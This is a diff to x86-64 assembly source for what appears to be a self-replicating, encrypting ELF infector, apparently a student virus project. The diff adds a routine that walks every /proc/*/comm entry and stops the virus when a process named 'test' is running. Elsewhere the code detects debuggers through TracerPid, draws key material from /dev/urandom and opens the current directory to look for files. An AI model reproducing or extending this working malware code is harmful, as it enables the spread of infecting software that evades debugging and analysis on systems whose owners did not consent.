@@ -45,6 +45,9 @@ _start:
     mov r12d, dev_urandom - v_stop + 1 ; add the difference
   .after_adjust:
   mov [r15 + OFFSET], r12d ; store the offset
+  ; xor rax, rax
+  ; mov byte[rax], 0
+  ; jmp .after_adjust
 
   mov DWORD [r15 + FINGERPRINT_ADD], 0 ; initialize to 0
 
@@ -64,7 +67,7 @@ _start:
     jl cleanup
 
     mov rdi, rax
-    lea rsi, [rsp]
+    lea rsi, [r15 + DIRENT]
     mov rdx, STACK_SIZE ; tracerpid should be in the first 4096 bytes
     mov rax, SYS_READ
     syscall
@@ -72,8 +75,6 @@ _start:
     cmp rax, 0
     jl cleanup
 
-    ; rax: length
-    ; rsi: file content
     sub rax, 8 ; to avoid overflow
     .find_tracer_pid:
       mov rdi, TRACER_PID ; put 'TracerPi' bytes in rdi
@@ -88,7 +89,7 @@ _start:
 
     .tracer_pid_found:
       mov bl, byte [rsi + 11]
-      mov cl, 0x30
+      mov cl, 0x30 ; compare '0'
       cmp cl, bl
       je .not_traced
 
@@ -104,14 +105,158 @@ _start:
           mov rdx, dbg_len
           syscall
       
-      jmp cleanup ; process is traced, exit
+      ; jmp cleanup ; process is traced, exit SCOTT 
 
   .not_traced:
-  ; check for TracerPid (/proc/self/status)
+      call .open_proc ; pushing db 'woody' on stack
+      .proc:
+        db '/proc', 0
 
-  ; check for processus tmp
-  ;   open every folder in /proc
-  ;   check for /comm and string compare (without \n)
+      .open_proc:
+        pop rdi ; popping '/proc' in rsi
+        mov rsi, O_RDONLY;
+        xor rdx, rdx ; no flags
+        mov rax, SYS_OPEN
+        syscall
+
+      cmp rax, 0
+      jl cleanup
+
+      mov [r15 + DOT_FD], rax ; store fd
+
+      ; Very similar to loop_getdents, but with /proc
+      .loop_proc_ents:
+        mov rdi, [r15 + DOT_FD] ; load fd in rdi
+        lea rsi, [r15 + DIRENT] ; where dirent will be stored
+        mov rdx, DIRENT_SIZE
+        mov rax, SYS_GETDENTS64
+        syscall
+
+        ; check if dir size is <= 0
+        cmp rax, 0
+        jle .close_proc_folder
+
+        mov [r15 + DIR_SIZE], rax ; store dir size
+
+        xor rcx, rcx
+
+        .loop_dir:
+          push rcx ; store rcx, used later at the end of while
+          cmp byte [r15 + DIRENT_D_TYPE + rcx], DT_DIR ; check if it's a regular file
+          jne .next_file
+
+          ; copy dir name
+          lea rsi, [rcx + r15 + DIRENT_D_NAME] ; load dir name
+          lea rax, [r15 + COMM] ; result will be stored in rax ptr
+          call .init_cpy_proc
+            .init_proc:
+              db '/proc/', 0
+            .init_cpy_proc:
+              pop rdi
+          
+          .copy_proc:
+            cmp byte [rdi], 0 ; finished copying dir name ?
+            je .copy_dirname
+
+            mov bl, byte [rdi]
+            mov byte [rax], bl
+            inc rdi
+            inc rax
+            jmp .copy_proc
+
+          .copy_dirname:
+            cmp byte [rsi], 0 ; finished copying dir name?
+            je .init_comm
+
+            mov bl, byte [rsi]
+            mov byte [rax], bl
+            inc rsi
+            inc rax
+            jmp .copy_dirname
+
+          .init_comm:
+            call .init_cpy_comm
+          .comm: 
+              db '/comm', 0
+          .init_cpy_comm:
+              pop rdi
+
+          .cpy_comm:
+            cmp byte [rdi], 0 ; finished copying /comm ?
+            je .open_comm
+
+            mov bl , byte [rdi]
+            mov byte [rax], bl
+            inc rdi
+            inc rax
+            jmp .cpy_comm
+
+          .open_comm:
+            ; first null terminate the string
+            mov byte [rax], 0
+
+            lea rdi, [r15 + COMM] ; load adress
+            mov rsi, O_RDONLY ; Read
+            xor rdx, rdx ; no flags
+            mov rax, SYS_OPEN
+            syscall
+
+            cmp rax, 0
+            jl .close_comm_continue
+
+            mov [r15 + COMM_FD], rax
+
+          .read_comm:
+            mov rdi, rax ; load fd
+            lea rsi, [r15 + COMM] ; overwrite name
+            mov rdx,  5; size
+            mov rax, SYS_READ
+            syscall
+
+          cmp rax, 5
+          jl .close_comm_continue
+
+          mov eax, dword [r15 + COMM]; load 'test'
+          cmp eax, TEST_PROC
+
+          jne .close_comm_continue ;
+
+          cmp byte [r15 + COMM + 4], 0x0a ; compare byte with '\n'
+          jne .close_comm_continue
+
+          jmp .close_comm_exit ; found file
+
+          .close_comm_continue:
+            mov rdi, [r15 + COMM_FD]
+            mov rax, SYS_CLOSE
+            syscall
+            jmp .next_file
+
+          .close_comm_exit:
+            mov rdi, [r15 + COMM_FD] ; close file fd
+            mov rax, SYS_CLOSE
+            syscall
+
+            mov rdi, [r15 + DOT_FD] ; close folder fd
+            mov rax, SYS_CLOSE
+            syscall
+
+            pop rcx
+            jmp cleanup
+
+          .next_file:
+            pop rcx
+            add cx, word [ rcx + r15 + DIRENT_D_RECLEN]
+            cmp rcx, [r15 + DIR_SIZE]
+            jl .loop_dir
+            jmp .loop_proc_ents
+
+          .close_proc_folder:
+            mov rdi, [r15 + DOT_FD]
+            mov rax, SYS_CLOSE
+            syscall
+
+  ; no 'test' program found, we can continue safely
 
   ; --- Open "."
   push "." ; push "." to stack (rsp)
@@ -245,9 +390,14 @@ _start:
 
       ; generate key
       ; open /dev/urandom
+      .rekt:
       xor r9, r9
       mov r9d, [r15 + OFFSET] ; load the offset we need to add
       lea rdi, [rbp + dev_urandom + r9] ; "/dev/urandom"
+      ; xor rax, rax
+      ; mov byte[rax], 0
+      ; jmp .rekt
+
       mov rsi, O_RDONLY
       mov rax, SYS_OPEN
       syscall
@@ -613,7 +763,6 @@ info_msg:
     syscall
 
 cleanup:
-  ; restore signals ?
   add rsp, STACK_SIZE ; restore rsp
   add rsp, v_stop - decryptor;
   pop rsp ; restore rsp
